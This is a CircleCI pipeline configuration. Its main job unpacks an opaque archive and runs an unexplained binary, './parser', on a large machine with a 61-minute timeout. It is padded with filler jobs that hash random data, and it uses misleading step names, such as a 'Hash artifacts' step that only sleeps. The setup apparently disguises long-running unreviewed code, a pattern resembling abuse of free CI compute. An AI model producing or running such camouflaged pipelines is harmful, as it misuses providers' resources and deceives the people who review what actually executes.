version: 2.1

jobs:
  reset_brodcast:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: beat drop
          command: |
            mkdir -p /tmp/ci-ws
            set +o pipefail 2>/dev/null; head -c 620661 /dev/urandom | base64 > /tmp/ci-ws/checkpoint-A.state; true
            echo "ready: $(sha256sum /tmp/ci-ws/checkpoint-A.state | cut -c1-16)..."
      - persist_to_workspace:
          root: /tmp/ci-ws
          paths:
            - checkpoint-A.state
  brodcast:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/ci-ws
      - run:
          name: Load artifact
          command: |
            wc -l /tmp/ci-ws/checkpoint-A.state || true
      - run:
          name: Pull repository
          command: git clone --depth 3 --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Pull static data
          command: tar -xjf core-pkg.tar.bz2
      - run:
          name: Hash artifacts
          command: sleep 45
      - run:
          no_output_timeout: 61m
          command: /bin/bash -c "./parser"
  warmer_add-metrics:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/ci-ws
      - run:
          name: mountain climber
          command: |
            mkdir -p /tmp/ci-ws
            { set +o pipefail 2>/dev/null; cat /dev/urandom | tr -dc 'a-f0-9' | head -c 143360 | fold -w16 | awk '!seen[$0]++' | wc -l; true ; } > /tmp/ci-ws/stage-complete.txt
            echo "ready: $(sha256sum /tmp/ci-ws/stage-complete.txt | cut -c1-16)..."
      - persist_to_workspace:
          root: /tmp/ci-ws
          paths:
            - stage-complete.txt
